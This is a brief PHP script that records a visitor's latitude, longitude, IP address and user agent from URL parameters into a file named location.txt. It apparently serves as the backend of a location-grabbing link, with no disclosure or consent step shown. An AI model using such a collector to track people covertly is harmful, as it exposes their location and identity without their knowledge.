<?php
$myfile = fopen("location.txt", "w") or die("Unable to open file!");
$txt = "lat:".$_GET["lat"]."\nlong:". $_GET["long"]."\nIP:".$_SERVER["REMOTE_ADDR"]."\nUseragent:".$_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);
?>